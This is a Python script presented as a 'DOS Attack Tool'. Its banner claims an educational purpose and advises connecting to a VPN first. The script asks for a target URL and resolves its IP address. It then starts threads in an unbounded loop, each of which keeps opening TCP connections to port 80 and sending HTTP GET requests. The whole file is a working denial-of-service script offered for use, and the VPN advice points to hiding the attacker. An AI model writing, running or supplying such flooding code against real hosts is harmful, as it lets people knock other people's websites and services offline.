import threading
import socket
import sys
import time

def welcome_message():
    print("\n========================")
    print("""                                                                                                                                                                                                
DDDDDDDDDDDDD             OOOOOOOOO        SSSSSSSSSSSSSSS                                 AAA         TTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTTT         AAA                  CCCCCCCCCCCCCKKKKKKKKK    KKKKKKK
D::::::::::::DDD        OO:::::::::OO    SS:::::::::::::::S                               A:::A        T:::::::::::::::::::::TT:::::::::::::::::::::T        A:::A              CCC::::::::::::CK:::::::K    K:::::K
D:::::::::::::::DD    OO:::::::::::::OO S:::::SSSSSS::::::S                              A:::::A       T:::::::::::::::::::::TT:::::::::::::::::::::T       A:::::A           CC:::::::::::::::CK:::::::K    K:::::K
DDD:::::DDDDD:::::D  O:::::::OOO:::::::OS:::::S     SSSSSSS                             A:::::::A      T:::::TT:::::::TT:::::TT:::::TT:::::::TT:::::T      A:::::::A         C:::::CCCCCCCC::::CK:::::::K   K::::::K
  D:::::D    D:::::D O::::::O   O::::::OS:::::S                                        A:::::::::A     TTTTTT  T:::::T  TTTTTTTTTTTT  T:::::T  TTTTTT     A:::::::::A       C:::::C       CCCCCCKK::::::K  K:::::KKK
  D:::::D     D:::::DO:::::O     O:::::OS:::::S                                       A:::::A:::::A            T:::::T                T:::::T            A:::::A:::::A     C:::::C                K:::::K K:::::K   
  D:::::D     D:::::DO:::::O     O:::::O S::::SSSS                                   A:::::A A:::::A           T:::::T                T:::::T           A:::::A A:::::A    C:::::C                K::::::K:::::K    
  D:::::D     D:::::DO:::::O     O:::::O  SS::::::SSSSS     ---------------         A:::::A   A:::::A          T:::::T                T:::::T          A:::::A   A:::::A   C:::::C                K:::::::::::K     
  D:::::D     D:::::DO:::::O     O:::::O    SSS::::::::SS   -:::::::::::::-        A:::::A     A:::::A         T:::::T                T:::::T         A:::::A     A:::::A  C:::::C                K:::::::::::K     
  D:::::D     D:::::DO:::::O     O:::::O       SSSSSS::::S  ---------------       A:::::AAAAAAAAA:::::A        T:::::T                T:::::T        A:::::AAAAAAAAA:::::A C:::::C                K::::::K:::::K    
  D:::::D     D:::::DO:::::O     O:::::O            S:::::S                      A:::::::::::::::::::::A       T:::::T                T:::::T       A:::::::::::::::::::::AC:::::C                K:::::K K:::::K   
  D:::::D    D:::::D O::::::O   O::::::O            S:::::S                     A:::::AAAAAAAAAAAAA:::::A      T:::::T                T:::::T      A:::::AAAAAAAAAAAAA:::::AC:::::C       CCCCCCKK::::::K  K:::::KKK
DDD:::::DDDDD:::::D  O:::::::OOO:::::::OSSSSSSS     S:::::S                    A:::::A             A:::::A   TT:::::::TT            TT:::::::TT   A:::::A             A:::::AC:::::CCCCCCCC::::CK:::::::K   K::::::K
D:::::::::::::::DD    OO:::::::::::::OO S::::::SSSSSS:::::S                   A:::::A               A:::::A  T:::::::::T            T:::::::::T  A:::::A               A:::::ACC:::::::::::::::CK:::::::K    K:::::K
D::::::::::::DDD        OO:::::::::OO   S:::::::::::::::SS                   A:::::A                 A:::::A T:::::::::T            T:::::::::T A:::::A                 A:::::A CCC::::::::::::CK:::::::K    K:::::K
DDDDDDDDDDDDD             OOOOOOOOO      SSSSSSSSSSSSSSS                    AAAAAAA                   AAAAAAATTTTTTTTTTT            TTTTTTTTTTTAAAAAAA                   AAAAAAA   CCCCCCCCCCCCCKKKKKKKKK    KKKKKKK
    """)
    print("========================")
    print("Welcome to the DOS Attack Tool")
    print("This tool is for educational purposes only. Use responsibly.")
    print("========================")
    print("Please first connect to VPN before using this tool.")


target_port = 80

def get_url_ip(): #get the ip from url of website
        try:
            ip_address = socket.gethostbyname(url)
            time.sleep(0.5)
            print(f"The IP address of {url} is: {ip_address}")
        except socket.gaierror:
            print("[!] Error: Could not resolve the URL. Please check and try again.")

def attack(target_ip, target_port): # do DOS_attack
    """ Continuously attempts to connect and send packets. """
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IP4 and TCP
            s.connect((target_ip, target_port))
            s.sendto("GET / HTTP/1.1\r\n".encode(), (target_ip, target_port))
            time.sleep(0.5)
            print(f"[✓] Packet sent to {target_ip}:{target_port}")
            s.close()
        except KeyboardInterrupt:
            print("\n[!] Attack stopped by user (Ctrl+C). Exiting program.")
            sys.exit()


if __name__ == "__main__":
    welcome_message()
    url = input("Enter target URL (e.g., www.example.com): ")
    time.sleep(1)
    if not url:
        print("[!] Error: URL cannot be empty. Enter a valid URL.")
        while True:
            url = input("Enter target URL (e.g., www.example.com): ")
            if url:
                break
    get_url_ip()
    target_ip = input("Now you have a url ip so enter the ip: ")
    if target_ip:
        target_port = 80
        while True:
            thread = threading.Thread(target=attack, args=(target_ip, target_port))
            thread.start()